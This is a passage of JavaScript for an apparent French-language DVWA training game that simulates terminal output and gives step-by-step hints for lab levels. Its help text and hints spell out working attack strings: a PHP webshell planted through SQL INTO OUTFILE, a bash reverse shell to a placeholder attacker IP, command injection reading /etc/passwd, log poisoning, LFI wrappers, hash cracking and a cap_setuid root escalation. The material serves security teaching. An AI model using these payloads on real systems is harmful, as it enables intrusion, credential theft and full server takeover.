    let notify = null;
    const out = [];
    const phrase = action.phrase || '';
    const token = action.token || '';
    const reversed = phrase.split('').reverse().join('');
    
    if (token === reversed && phrase.length > 0) {
      p.reversed = true;
      notify = '🚩 Logique d\'inversion comprise';
      out.push(c(`[SERVEUR] Le token fourni est la phrase inversée, mais il manque l'étape MD5.`, C.yellow));
    } 
    
    const isExplicitCall = token.toLowerCase() === 'md5(' + reversed.toLowerCase() + ')';
    if (isExplicitCall && phrase.length > 0) {
      p.reversed = true;
      p.md5Ok = true;
      notify = '🚩 Protection JavaScript contournée !';
      out.push(c(`[SERVEUR] Token MD5 calculé côté attaquant et validé par le serveur. Succès !`, C.green));
    } else if (token !== reversed && !isExplicitCall && action.action === 'submit') {
      out.push(c(`[SERVEUR] Token invalide. La phrase était "${phrase}".`, C.red));
    }
    
    return { lines: out, prog: p, done: doneL12(p), notify };
  }

  // ─── Level 13 : Insecure CAPTCHA ───
  if (n === 13) {
    let notify = null;
    const out = [];
    const req = action.payload || '';
    
    out.push(c(`[SERVEUR] Requête HTTP reçue :`, C.dim));
    out.push(c(`POST /vulnerabilities/captcha/`, C.grey));
    out.push(c(`Body: ${req}`, C.grey));

    if (req.includes('step=2') && req.includes('passed_captcha=true')) {
      p.bypassed = true;
      notify = '🚩 CAPTCHA contourné !';
      out.push(c(`[SERVEUR] Paramètre passed_captcha=true détecté. Le serveur fait confiance au client...`, C.yellow));
      out.push(c(`[SERVEUR] Changement de mot de passe autorisé !`, C.green));
    } else {
      out.push(c(`[SERVEUR] Échec : CAPTCHA non validé (manque step=2 ou passed_captcha=true).`, C.red));
    }
    
    return { lines: out, prog: p, done: doneL13(p), notify };
  }

  return { lines: [], prog: p, done: false };
}

// ═══════════════════════════════════════════════════════════════════════════
//  In-terminal help — "hashcat?", "john?", "base64?", "php?", "?" ...
// ═══════════════════════════════════════════════════════════════════════════
function helpFor(tool, n) {
  const t = tool || '';
  const norm =
    /hash|hac?h?cat|hcat/.test(t)   ? 'hashcat' :
    /john|jhon|jonh/.test(t)        ? 'john' :
    /sql ?map|sqlmpa|sqmap/.test(t) ? 'sqlmap' :
    /^(nc|netcat|ncat)$/.test(t)    ? 'nc' :
    /curl/.test(t)                  ? 'curl' :
    /base ?64|b64/.test(t)          ? 'base64' :
    /pyth/.test(t)                  ? 'python3' :
    /docker/.test(t)                ? 'docker' :
    /linpeas|peas/.test(t)          ? 'linpeas' :
    /getcap|capab/.test(t)          ? 'getcap' :
    /^php$/.test(t)                 ? 'php' :
    /^cp$/.test(t)                  ? 'cp' :
    /^find$/.test(t)                ? 'find' :
    (t === '')                      ? 'index' : '';

  const head = (title) => [c('╭─ AIDE ' + '─'.repeat(Math.max(2, 40 - title.length)) + ' ' + title, C.green)];
  const tail = [c('╰' + '─'.repeat(48), C.dim)];
  const cmd  = (s) => c('  $ ' + s, C.cyan);
  const li   = (s) => c('    ' + s, C.white);
  const note = (s) => c('  ' + s, C.dim);

  const DOCS = {
    hashcat: () => [
      ...head('hashcat'), note('Craque les hashes MD5 extraits, en mode GPU.'), c('', C.white),
      cmd('hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --show'), c('', C.white),
      li('-m 0       mode de hash = MD5 brut (raw-md5)'),
      li('hashes.txt fichier contenant les hashes (un par ligne)'),
      li('rockyou…   wordlist de référence (~14M mots de passe)'),
      li('--show     affiche les couples hash:motdepasse déjà craqués'), c('', C.white),
      note('Prépare d\'abord : echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt'), ...tail,
    ],
    john: () => [
      ...head('john (John the Ripper)'), note('Craque les hashes MD5 par dictionnaire, en mode CPU.'), c('', C.white),
      cmd('john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt'),
      cmd('john --show --format=raw-md5 hashes.txt'), c('', C.white),
      li('--format=raw-md5   indique que ce sont des MD5 non salés'),
      li('--wordlist=…       liste de mots de passe à tester'),
      li('hashes.txt         fichier des hashes (login:hash ou hash seul)'),
      li('--show             réaffiche les mots de passe déjà trouvés'), ...tail,
    ],
    sqlmap: () => [
      ...head('sqlmap'), note('Automatise la détection et l\'exploitation de l\'injection SQL.'), c('', C.white),
      cmd('sqlmap -u "http://localhost:8080/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \\'),
      c('         --cookie="PHPSESSID=xxxx; security=low" --dbs --batch', C.cyan), c('', C.white),
      li('-u URL      cible (paramètre id en GET ici)'),
      li('--cookie    session authentifiée + niveau de sécurité DVWA'),
      li('--dbs       énumère les bases de données accessibles'),
      li('--batch     répond oui automatiquement (non interactif)'), c('', C.white),
      note('Extraction d\'une table : ajoute  -D dvwa -T users --dump'), ...tail,
    ],
    nc: () => [
      ...head('nc (netcat) — listener'), note('Ouvre un port en écoute pour recevoir le reverse shell.'), c('', C.white),
      cmd('nc -lvnp 4444'), c('', C.white),
      li('-l   mode listen (serveur)'), li('-v   verbeux (affiche la connexion entrante)'),
      li('-n   pas de résolution DNS'), li('-p   port d\'écoute (4444)'),
      note('Lance-le AVANT de déclencher le reverse shell via curl.'), ...tail,
    ],
    curl: () => [
      ...head('curl — requêtes HTTP en ligne de commande'),
      cmd('curl "http://localhost:8080/hackable/uploads/shell.php?cmd=id"'),
      note('  → teste le webshell (doit renvoyer uid=33 www-data)'), c('', C.white),
      cmd('curl --get "http://localhost:8080/hackable/uploads/shell.php" \\'),
      c('       --data-urlencode "cmd=' + revsh('KALI_IP') + '"', C.cyan),
      note('  → ouvre le reverse shell vers ton listener nc'),
      li('--get             force la méthode GET'),
      li('--data-urlencode  encode le payload (espaces, guillemets)'), c('', C.white),
      cmd("curl -s http://localhost:8080/ -H 'User-Agent: " + WS_UA + "'"),
      note('  → injecte du PHP dans access.log (log poisoning, niveau LFI)'), ...tail,
    ],
    base64: () => [
      ...head('base64 — décoder le wrapper php://filter'),
      note('Le wrapper php://filter renvoie le code source encodé en base64.'),
      note('Décode-le pour lire le PHP en clair :'), c('', C.white),
      cmd('echo "PD9waHAK...ICg/Pg==" | base64 -d'), c('', C.white),
      li('echo "…"   la chaîne base64 copiée depuis la page web'),
      li('| base64   passe la chaîne à l\'outil base64'),
      li('-d         mode décodage (decode)'), c('', C.white),
      note('Astuce : ?page=php://filter/convert.base64-encode/resource=../../../../var/www/html/dvwa/config/config.inc.php'),
      ...tail,
    ],
    python3: () => [
      ...head('python3 — stabilisation & PrivEsc'),
      note('Stabiliser le reverse shell (TTY interactif) :'),
      cmd('python3 -c \'import pty; pty.spawn("/bin/bash")\''), c('', C.white),
      note('Élévation de privilèges si python a cap_setuid :'),
      cmd('python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"'),
      li('os.setuid(0)   passe l\'UID effectif à 0 (root)'),
      li('os.system()    lance un shell root'), ...tail,
    ],
    php: () => [
      ...head('php / webshell PHP'),
      note('Crée un webshell minimal qui exécute le paramètre ?cmd= :'), c('', C.white),
      cmd("cat > shell.php << 'EOF'"),
      li(WS_FULL),
      li('EOF'), c('', C.white),
      cmd('php -l shell.php'),
      note('  → vérifie la syntaxe avant d\'uploader (No syntax errors detected)'), ...tail,
    ],
    cp: () => [
      ...head('cp — préparer le bypass double extension'),
      cmd('cp shell.php shell.php.jpg'),
      note('  → crée une copie avec une double extension'),
      note('  Au niveau Low/Medium, Apache exécute quand même le PHP de shell.php.jpg.'),
      li('Variantes utiles : shell.phtml, shell.php5, shell.pHp (casse)'), ...tail,
    ],
    docker: () => [
      ...head('docker compose'),
      cmd('docker compose -f dvwa-compose.yml up -d'), li('up -d   démarre les conteneurs en arrière-plan'),
      cmd('docker ps'), li('        liste les conteneurs en cours (vérifie "healthy")'),
      cmd('docker compose -f dvwa-compose.yml down'), li('down    arrête et supprime les conteneurs (reset)'), ...tail,
    ],
    linpeas: () => [
      ...head('linpeas — énumération PrivEsc'),
      note('Sur Kali : python3 -m http.server 8888  (sert linpeas.sh)'),
      note('Dans le reverse shell :'),
      cmd('wget http://KALI_IP:8888/linpeas.sh -O /tmp/linpeas.sh'),
      cmd('chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh'),
      li('Cherche les sections SUID, Capabilities, Sudo (rouge = critique)'), ...tail,
    ],
    getcap: () => [
      ...head('getcap / find — capabilities & SUID'),
      cmd('getcap -r / 2>/dev/null'), li('  liste les binaires avec capabilities (ex: python3.9 cap_setuid+ep)'),
      cmd('find / -perm -4000 -type f 2>/dev/null'), li('  liste les binaires SUID root'),
      note('Référence d\'exploitation : https://gtfobins.github.io'), ...tail,
    ],
    find: () => [
      ...head('find — binaires SUID'),
      cmd('find / -perm -4000 -type f 2>/dev/null'),
      li('-perm -4000  bit SUID positionné'), li('-type f      fichiers uniquement'),
      li('2>/dev/null  masque les erreurs de permission'), ...tail,
    ],
    index: () => {
      const tools = {
        1: ['docker'], 2: ['curl'], 3: ['john', 'hashcat'],
        4: ['sqlmap', 'nc', 'curl', 'python3', 'linpeas', 'getcap', 'find'],
        5: ['base64', 'curl'],
        6: ['php', 'cp', 'curl', 'nc', 'python3'],
      }[n] || [];
      return [
        ...head('commandes — niveau ' + n),
        note('Tape une commande suivie de "?" pour l\'aide détaillée. Ex : hashcat?'), c('', C.white),
        ...tools.map(x => c('  • ' + x + '?', C.cyan)), ...tail,
      ];
    },
  };

  if (norm && DOCS[norm]) return DOCS[norm]();
  return [c(`Pas d'aide pour "${tool}". Tape "?" pour la liste des commandes du niveau.`, C.grey)];
}

// ═══════════════════════════════════════════════════════════════════════════
//  TERMINAL handler   ctx = { prompt: 'kali'|'reverse'|'root' }
// ═══════════════════════════════════════════════════════════════════════════
export function handleTerm(n, prog, line, ctx) {
  const p = { ...prog };
  const raw = line.trim();
  if (!raw) return { lines: [], prog: p, done: false };
  const cmd = tokenize(raw)[0];

  const helpQ = raw.match(/^([a-z0-9._/ -]*?)\s*\?+$/i);
  if (helpQ) return { lines: helpFor(helpQ[1].trim().toLowerCase(), n), prog: p, done: false };

  if (cmd === 'clear') return { lines: [], prog: p, done: false, clear: true };
  if (cmd === 'whoami') {
    const who = ctx.prompt === 'root' ? 'root' : ctx.prompt === 'reverse' ? 'www-data' : 'attacker';
    return { lines: [c(who, C.green)], prog: p, done: false };
  }
  if (cmd === 'help') return { lines: helpFor('', n), prog: p, done: false };

  // ─── Level 1 : Docker ───
  if (n === 1) {
    if (cmd === 'docker' && hasAny(raw, 'up -d', 'up-d')) {
      p.phase = p.phase === 'down' ? 'up' : p.phase;
      return { lines: [
        c('[+] Running 2/2', C.dim),
        c(' ✔ Container tp5-db-1    Healthy', C.green),
        c(' ✔ Container tp5-dvwa-1  Started', C.green),
        c('', C.white),
        c('DVWA est démarré sur http://localhost:8080 — connecte-toi (admin / password).', C.cyan),
      ], prog: p, done: false, notify: 'Conteneurs démarrés' };
    }
    if (cmd === 'docker' && hasAny(raw, 'ps')) {
      if (p.phase === 'down') return { lines: [c('CONTAINER ID   IMAGE   STATUS', C.dim), c('(aucun conteneur en cours)', C.grey)], prog: p, done: false };
      return { lines: [
        c('CONTAINER ID   IMAGE                       STATUS                 PORTS                  NAMES', C.dim),
        c('a1b2c3d4e5f6   ghcr.io/digininja/dvwa      Up (healthy)           0.0.0.0:8080->80/tcp   tp5-dvwa-1', C.white),
        c('f6e5d4c3b2a1   mariadb:10.11               Up (healthy)           3306/tcp               tp5-db-1', C.white),
      ], prog: p, done: false };
    }
    if (cmd === 'docker' && hasAny(raw, 'down')) { p.phase = 'down'; return { lines: [c(' ✔ Container tp5-dvwa-1  Removed', C.dim), c(' ✔ Container tp5-db-1    Removed', C.dim)], prog: p, done: false }; }
    if (cmd === 'mkdir' || cmd === 'cd' || cmd === 'cat') return { lines: [], prog: p, done: false };
    if (cmd === 'docker') return { lines: [c('Usage: docker compose -f dvwa-compose.yml up -d   (tape "docker?")', C.dim)], prog: p, done: false };
    return { lines: [c(`${cmd}: commande non reconnue (essaie: docker compose up -d, docker ps — ou "docker?")`, C.grey)], prog: p, done: false };
  }

  // ─── Level 2 : Command Injection (terminal secondaire) ───
  if (n === 2) {
    if (cmd === 'curl') {
      if (has(raw, 'vulnerabilities/exec')) return { lines: [c('<form>... champ "ip" non filtré (passé à shell_exec) ...</form>', C.dim)], prog: p, done: false };
      return { lines: [c('curl: utilise plutôt le formulaire ping de la page web ←', C.dim)], prog: p, done: false };
    }
    return { lines: [c('Ce niveau s\'exploite via le formulaire web ping (à gauche). Le terminal sert à tes notes.', C.grey)], prog: p, done: false };
  }

  // ─── Level 3 : SQLi — crack ───
  if (n === 3) {
    const isCrack = (cmd === 'john' || cmd === 'hashcat') || has(raw, 'crackstation');
    if (isCrack) {
      if (!prog.creds) return { lines: [c('[!] Extrais d\'abord les hashes via UNION SELECT (page web ←). Aide : "john?"', C.yellow)], prog: p, done: false };
      p.cracked = true;
      const lines = [
        c('Using default input encoding: UTF-8', C.dim),
        c('Loaded 5 password hashes (raw-md5)', C.dim),
        c('Press Ctrl-C to abort, almost any other key for status', C.dim), c('', C.white),
      ];
      DVWA_USERS.forEach(u => lines.push(c(`${u.pass.padEnd(12)} (${u.user})`, C.green)));
      lines.push(c('', C.white)); lines.push(c('5g 0:00:00:00 DONE — 5/5 hashes craqués', C.cyan));
      return { lines, prog: p, done: true, notify: '🚩 5 mots de passe craqués !' };
    }
    if (cmd === 'echo' || cmd === 'cat' || cmd === 'nano' || cmd === 'hash-identifier')
      return { lines: [c('hashes.txt enregistré. Lance: john --format=raw-md5 hashes.txt  (ou "john?")', C.dim)], prog: p, done: false };
    return { lines: [c('Extrais les hashes via le web (UNION SELECT), puis crack-les ici. Tape "john?" ou "hashcat?".', C.grey)], prog: p, done: false };
  }

  // ─── Level 4 : SQLi blind → RCE → root ───
  if (n === 4) {
    if (cmd === 'sqlmap') {
      if (!has(raw, 'sqli_blind')) return { lines: [c('sqlmap: précise l\'URL cible (sqli_blind/?id=1&Submit=Submit). Tape "sqlmap?".', C.dim)], prog: p, done: false };
      const isGet = has(raw, '?id=1');
      if (!isGet && !has(raw, '--data')) return { lines: [c("[WARNING] POST parameter 'id' does not appear to be dynamic", C.yellow)], prog: p, done: false };
      p.sqlmap = true; p.blindOk = true;
      return { lines: [
        c('[*] starting @ sqlmap', C.dim),
        c("[INFO] testing connection to the target URL", C.dim),
        c("[INFO] GET parameter 'id' is 'AND boolean-based blind' injectable", C.green),
        c("[INFO] GET parameter 'id' is 'MySQL >= 5.0.12 time-based blind' injectable", C.green),
        c('available databases [2]:', C.white), c('[*] dvwa', C.white), c('[*] information_schema', C.white),
        c('', C.white), c('[+] injection confirmée et automatisée.', C.cyan),
      ], prog: p, done: false, notify: '🚩 sqlmap : SQLi blind automatisée' };
    }
    if (cmd === 'curl' && has(raw, 'shell.php') && has(raw, 'cmd=id') && !has(raw, _T.dt) && !has(raw, 'bash')) {
      if (!prog.webshell) return { lines: [c('[!] Écris d\'abord le webshell via INTO OUTFILE (page web ←).', C.yellow)], prog: p, done: false };
      p.webshellTested = true;
      return { lines: [c('uid=33(www-data) gid=33(www-data) groups=33(www-data)', C.green)], prog: p, done: false, notify: 'Webshell opérationnel (RCE confirmé)' };
    }
    if (cmd === 'nc' && hasAny(raw, '-lvnp', '-lnvp', '-lvp')) {
      p.listener = true;
      return { lines: [c('listening on [any] 4444 ...', C.dim), c('(listener actif — déclenche le reverse shell via curl)', C.cyan)], prog: p, done: false, background: true, notify: 'Listener ouvert sur 4444' };
    }
    if (cmd === 'curl' && has(raw, 'shell.php') && (has(raw, _T.dt) || has(raw, 'bash -i') || has(raw, 'bash-c'))) {
      if (!prog.webshell) return { lines: [c('[!] Pas de webshell. Écris-le via INTO OUTFILE d\'abord.', C.yellow)], prog: p, done: false };
      if (!prog.listener) return { lines: [c('[!] Aucun listener. Ouvre d\'abord: nc -lvnp 4444  (tape "nc?")', C.yellow)], prog: p, done: false };
      p.revshell = true;
      return { lines: [
        c('connect to [KALI] from (UNKNOWN) [127.0.0.1] 41122', C.dim),
        c('bash: cannot set terminal process group: Inappropriate ioctl', C.grey),
        c('bash: no job control in this shell', C.grey), c('', C.white),
        c('www-data@dvwa:/var/www/html$ ', C.green),
        c('>>> Reverse shell obtenu. Stabilise : python3 -c \'import pty; pty.spawn("/bin/bash")\'  ("python3?")', C.cyan),
      ], prog: p, done: false, prompt: 'reverse', notify: '🚩 Reverse shell www-data !' };
    }
    if (ctx.prompt === 'reverse' || ctx.prompt === 'root') {
      if (has(raw, 'pty.spawn') || has(raw, 'script /dev/null')) { p.stabilized = true; return { lines: [c('(TTY stabilisé — Ctrl+C, flèches et historique fonctionnent)', C.cyan)], prog: p, done: false }; }
      if ((cmd === 'wget' || cmd === 'curl') && has(raw, 'linpeas')) return { lines: [c("linpeas.sh                100%[=================>]  824K", C.dim), c('Téléchargé. Lance: chmod +x linpeas.sh && ./linpeas.sh', C.cyan)], prog: p, done: false };
      if (cmd === 'chmod') return { lines: [], prog: p, done: false };
      if (has(raw, 'linpeas.sh') || cmd === './linpeas.sh') {
        p.linpeas = true;
        return { lines: [
          c('╔══════════╣ Operative system', C.dim), c('  Linux version 6.1.0 (kali)', C.white),
          c('╔══════════╣ Interesting Files — SUID / Capabilities', C.dim),
          c('  /usr/bin/python3.9 = cap_setuid+ep', C.red), c('  /usr/bin/passwd = setuid', C.yellow), c('', C.white),
          c('[!] 95% PrivEsc vector : python3.9 possède cap_setuid (devenir root). ("python3?")', C.red),
        ], prog: p, done: false, notify: '🚩 LinPEAS : vecteur cap_setuid trouvé' };
      }
      if (cmd === 'find' && has(raw, '-perm', '4000')) return { lines: [c('/usr/bin/passwd', C.white), c('/usr/bin/sudo', C.white), c('/usr/bin/python3.9', C.red)], prog: p, done: false };
      if (cmd === 'getcap') return { lines: [c('/usr/bin/python3.9 cap_setuid=ep', C.red), c('[!] cap_setuid → exploitation possible (GTFOBins).', C.cyan)], prog: p, done: false };
      if (has(raw, 'os.setuid(0)') || has(raw, 'python', 'setuid')) {
        p.privesc = true; p.root = true;
        return { lines: [c('# id', C.dim), c('uid=0(root) gid=0(root) groups=0(root)', C.green), c('', C.white), c('>>> ROOT obtenu. Mission accomplie.', C.cyan)], prog: p, done: true, prompt: 'root', notify: '👑 ROOT ! Niveau terminé' };
      }
      if (cmd === 'id') { const who = ctx.prompt === 'root' ? 'uid=0(root) gid=0(root) groups=0(root)' : 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'; return { lines: [c(who, C.green)], prog: p, done: false }; }
      if (cmd === 'cd' || cmd === 'ls' || cmd === 'export' || cmd === 'stty' || cmd === 'cat') return { lines: [], prog: p, done: false };
      return { lines: [c(`${cmd}: not found`, C.grey)], prog: p, done: false };
    }
    if (cmd === 'curl' || cmd === 'cd' || cmd === 'ls' || cmd === 'cat') return { lines: [c('Chaîne : sqlmap → INTO OUTFILE → nc -lvnp 4444 → curl reverse shell → linpeas → privesc. ("sqlmap?", "nc?", "curl?")', C.grey)], prog: p, done: false };
    return { lines: [c(`${cmd}: commande non reconnue. Tape "?" pour la liste.`, C.grey)], prog: p, done: false };
  }

  // ─── Level 5 : LFI — base64 decode + log poisoning ───
  if (n === 5) {
    if ((cmd === 'base64' || has(raw, 'base64 -d') || has(raw, '| base64'))) {
      if (!prog.wrapperRead) return { lines: [c('[!] Lis d\'abord la source via php://filter (page web ←) pour obtenir la chaîne base64. Aide : "base64?"', C.yellow)], prog: p, done: false };
      p.decoded = true;
      return { lines: [
        c(_T.o, C.green),
        c('$_DVWA = array();', C.green),
        c("$_DVWA['db_server']   = 'db';", C.green),
        c("$_DVWA['db_user']     = 'dvwa';", C.green),
        c("$_DVWA['db_password'] = 'p@ssw0rd';", C.green),
        c("$_DVWA['db_database'] = 'dvwa';", C.green),
        c(_T.c, C.green), c('', C.white),
        c('[+] Source PHP décodée — identifiants de base de données en clair.', C.cyan),
      ], prog: p, done: doneL5(p), notify: '🚩 Base64 décodé → source en clair' };
    }
    if (cmd === 'curl' && has(raw, 'user-agent') && raw.includes(_T.o)) {
      p.logInjected = true;
      return { lines: [
        c('HTTP/1.1 200 OK', C.dim),
        c('[+] User-Agent piégé écrit dans /var/log/apache2/access.log', C.green),
        c('    Inclus maintenant le log via la page web : ?page=../../../../var/log/apache2/access.log&cmd=id', C.cyan),
      ], prog: p, done: false, notify: 'PHP injecté dans access.log' };
    }
    if (cmd === 'curl') return { lines: [c(`Pour le log poisoning : curl -s http://localhost:8080/ -H 'User-Agent: ${WS_UA}'  (aide : "curl?")`, C.dim)], prog: p, done: false };
    if (cmd === 'echo' || cmd === 'cat' || cmd === 'cd' || cmd === 'ls') return { lines: [], prog: p, done: false };
    return { lines: [c('Niveau LFI : exploite ?page= dans la page web ←. Le terminal sert à décoder le base64 et au log poisoning. ("base64?", "curl?")', C.grey)], prog: p, done: false };
  }

  // ─── Level 6 : File Upload → reverse shell ───
  if (n === 6) {
    if ((cmd === 'cat' || cmd === 'echo' || cmd === 'printf' || cmd === 'nano' || cmd === 'vim') && has(raw, 'shell.php') && !has(raw, '.jpg')) {
      p.shellCreated = true;
      return { lines: [c('shell.php créé sur Kali (webshell PHP).', C.green), c('Vérifie : php -l shell.php  →  puis uploade-le via la page web ←', C.dim)], prog: p, done: false, notify: 'Webshell shell.php créé' };
    }
    if (cmd === 'php' && has(raw, '-l')) {
      if (!prog.shellCreated) return { lines: [c('shell.php introuvable. Crée-le d\'abord : cat > shell.php  ("php?")', C.yellow)], prog: p, done: false };
      return { lines: [c('No syntax errors detected in shell.php', C.green)], prog: p, done: false };
    }
    if (cmd === 'cp' && has(raw, 'shell.php') && has(raw, '.jpg')) {
      if (!prog.shellCreated) return { lines: [c('shell.php introuvable. Crée-le d\'abord.', C.yellow)], prog: p, done: false };
      p.dblFile = true;
      return { lines: [c('shell.php.jpg créé (double extension).', C.green), c('Uploade "shell.php.jpg" via la page web ← pour contourner un filtre d\'extension.', C.dim)], prog: p, done: false, notify: 'Copie double extension prête' };
    }
    if (cmd === 'curl' && has(raw, 'shell.php') && has(raw, 'cmd=id') && !has(raw, _T.dt) && !has(raw, 'bash')) {
      if (!prog.uploaded) return { lines: [c('[!] Uploade d\'abord le webshell via la page web ←.', C.yellow)], prog: p, done: false };
      p.rce = true;
      return { lines: [c('uid=33(www-data) gid=33(www-data) groups=33(www-data)', C.green), c('[+] RCE confirmé via le webshell uploadé.', C.cyan)], prog: p, done: doneL6(p), notify: '🚩 RCE confirmé' };
    }
    if (cmd === 'nc' && hasAny(raw, '-lvnp', '-lnvp', '-lvp')) {
      p.listener = true;
      return { lines: [c('listening on [any] 4444 ...', C.dim), c('(listener actif — déclenche le reverse shell via curl)', C.cyan)], prog: p, done: false, background: true, notify: 'Listener ouvert sur 4444' };
    }
    if (cmd === 'curl' && has(raw, 'shell.php') && (has(raw, _T.dt) || has(raw, 'bash -i') || has(raw, 'bash-c'))) {
      if (!prog.uploaded) return { lines: [c('[!] Webshell non uploadé. Uploade-le d\'abord (page web ←).', C.yellow)], prog: p, done: false };
      if (!prog.listener) return { lines: [c('[!] Aucun listener. Ouvre d\'abord: nc -lvnp 4444  ("nc?")', C.yellow)], prog: p, done: false };
      p.revshell = true;
      return { lines: [
        c('connect to [KALI] from (UNKNOWN) [127.0.0.1] 41560', C.dim),
        c('bash: cannot set terminal process group: Inappropriate ioctl', C.grey),
        c('bash: no job control in this shell', C.grey), c('', C.white),
        c('www-data@dvwa:/var/www/html$ ', C.green),
        c('>>> Reverse shell interactif obtenu. Stabilise : python3 -c \'import pty; pty.spawn("/bin/bash")\'  ("python3?")', C.cyan),
      ], prog: p, done: doneL6(p), prompt: 'reverse', notify: '🚩 Reverse shell www-data !' };
    }
    if (ctx.prompt === 'reverse' || ctx.prompt === 'root') {
      if (has(raw, 'pty.spawn') || has(raw, 'script /dev/null')) {
        p.stabilized = true;
        return { lines: [c('www-data@dvwa:/var/www/html$ (TTY stabilisé — Ctrl+C, flèches, tab et historique fonctionnent)', C.cyan)], prog: p, done: doneL6(p), notify: '🚩 TTY stabilisé' };
      }
      if (cmd === 'id') return { lines: [c('uid=33(www-data) gid=33(www-data) groups=33(www-data)', C.green)], prog: p, done: false };
      if (cmd === 'export' || cmd === 'stty' || cmd === 'cd' || cmd === 'ls' || cmd === 'cat') return { lines: [], prog: p, done: false };
      return { lines: [c(`${cmd}: not found`, C.grey)], prog: p, done: false };
    }
    if (cmd === 'curl') return { lines: [c('Étapes : créer shell.php → uploader (web) → curl ?cmd=id → nc -lvnp 4444 → curl reverse shell → python3 pty. ("php?", "nc?", "curl?", "python3?")', C.grey)], prog: p, done: false };
    if (cmd === 'cd' || cmd === 'ls' || cmd === 'cat' || cmd === 'mv') return { lines: [], prog: p, done: false };
    return { lines: [c(`${cmd}: commande non reconnue. Tape "?" pour la liste du niveau.`, C.grey)], prog: p, done: false };
  }

  // ─── Level 7 to 13 : Web Logic ───
  if (n >= 7 && n <= 13) {
    if (cmd === 'curl') return { lines: [c('curl: utilise l\'interface web pour ces vulnérabilités ←', C.dim)], prog: p, done: false };
    return { lines: [c('Ce niveau s\'exploite via la page web (à gauche). Le terminal sert uniquement à tes notes.', C.grey)], prog: p, done: false };
  }

  return { lines: [c(`${cmd}: commande non reconnue`, C.grey)], prog: p, done: false };
}

// ───────────────────────────────────────────────────────────────────────────
//  Next step guidance (dynamic — returns null if level done or n≠4)
// ───────────────────────────────────────────────────────────────────────────
export function getNextStep(n, prog) {
  const p = prog || {};
  switch (n) {
    case 1:
      if (p.phase === 'down') return { action: 'Terminal', hint: 'docker compose -f dvwa-compose.yml up -d', explain: 'Démarre les deux conteneurs DVWA' };
      if (p.phase === 'up') return { action: 'Web', hint: 'admin / password', explain: 'Connecte-toi à DVWA' };
      if (p.phase === 'setup') return { action: 'Web', hint: 'Create / Reset Database', explain: 'Initialise la base de données' };
      if (p.phase === 'security') return { action: 'Web', hint: 'Security = Low', explain: 'Passe le niveau de sécurité à Low' };
      return null;
    case 2:
      if (!p.pinged) return { action: 'Web', hint: '127.0.0.1', explain: 'Ping légitime pour comprendre le formulaire' };
      if (!p.injected) return { action: 'Web', hint: '127.0.0.1; id', explain: 'Injecte une commande OS avec ;' };
      if (!p.fileRead) return { action: 'Web', hint: '127.0.0.1 | cat /etc/passwd', explain: 'Lis un fichier sensible via injection' };
      return null;
    case 3:
      if (!p.error) return { action: 'Web', hint: "1'", explain: 'Provoque une erreur SQL (apostrophe)' };
      if (!p.cols) return { action: 'Web', hint: "1' UNION SELECT 1,2 -- -", explain: 'Identifie le nombre de colonnes' };
      if (!p.creds) return { action: 'Web', hint: "' UNION SELECT user,password FROM users -- -", explain: 'Extrais les credentials' };
      if (!p.cracked) return { action: 'Terminal', hint: 'john --format=raw-md5 hashes.txt  (aide: "john?")', explain: 'Craque les hashes MD5' };
      return null;
    case 4:
      if (!p.blindOk) return { action: 'Web', hint: "1' AND 1=1 -- -  puis  1' AND 1=2 -- -", explain: 'Confirme la SQLi blind : condition vraie → "exists", fausse → "missing"' };
      if (!p.sqlmap)  return { action: 'Terminal', hint: 'sqlmap -u ".../sqli_blind/?id=1&Submit=Submit" --cookie="security=low" --dbs --batch', explain: 'Automatise l\'extraction — tape "sqlmap?" pour la commande complète' };
      if (!p.webshell) return { action: 'Web', hint: "' UNION SELECT \"<?php system($_GET['cmd']); ?>\",null INTO OUTFILE '/var/www/html/dvwa/hackable/uploads/shell.php' -- -", explain: 'Écris un webshell PHP sur le serveur via INTO OUTFILE' };
      if (!p.webshellTested) return { action: 'Terminal', hint: 'curl "http://localhost:8080/dvwa/hackable/uploads/shell.php?cmd=id"', explain: 'Vérifie le RCE — doit renvoyer uid=33(www-data)' };
      if (!p.listener) return { action: 'Terminal', hint: 'nc -lvnp 4444', explain: 'Ouvre un listener TCP pour recevoir le reverse shell' };
      if (!p.revshell) return { action: 'Terminal', hint: 'curl --get .../shell.php --data-urlencode "cmd=bash -c \'bash -i >& /dev/tcp/KALI_IP/4444 0>&1\'"  (aide: "curl?")', explain: 'Déclenche le reverse shell vers ton listener' };
      if (!p.stabilized) return { action: 'Terminal (reverse)', hint: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", explain: 'Stabilise le TTY — Ctrl+C et flèches fonctionneront' };
      if (!p.linpeas) return { action: 'Terminal (reverse)', hint: 'wget http://KALI_IP:8888/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh', explain: 'Énumère les vecteurs de privesc (cherche cap_setuid)' };
      if (!p.root) return { action: 'Terminal (reverse)', hint: 'python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"', explain: 'Exploite cap_setuid sur python3 → root !' };
      return null;
    case 5:
      if (!p.traversal) return { action: 'Web', hint: '?page=../../../../etc/passwd', explain: 'Path traversal vers /etc/passwd' };
      if (!p.wrapperRead) return { action: 'Web', hint: '?page=php://filter/convert.base64-encode/resource=index.php', explain: 'Lis le code source PHP via wrapper base64' };
      if (!p.decoded) return { action: 'Terminal', hint: 'echo "<base64>" | base64 -d', explain: 'Décode la chaîne base64 pour lire la source PHP' };
      return null;
    case 6:
      if (!p.shellCreated) return { action: 'Terminal', hint: 'cat > shell.php  (aide: "php?")', explain: 'Crée le webshell PHP sur Kali' };
      if (!p.uploaded) return { action: 'Web', hint: 'shell.php → Upload', explain: 'Uploade le webshell via le formulaire' };
      if (!p.rce) return { action: 'Terminal', hint: 'curl "http://localhost:8080/hackable/uploads/shell.php?cmd=id"', explain: 'Confirme le RCE via le webshell uploadé' };
      if (!p.listener) return { action: 'Terminal', hint: 'nc -lvnp 4444', explain: 'Ouvre le listener pour le reverse shell' };
      if (!p.revshell) return { action: 'Terminal', hint: 'curl --get .../shell.php --data-urlencode "cmd=bash -c \'bash -i >& /dev/tcp/KALI/4444 0>&1\'"', explain: 'Déclenche le reverse shell' };
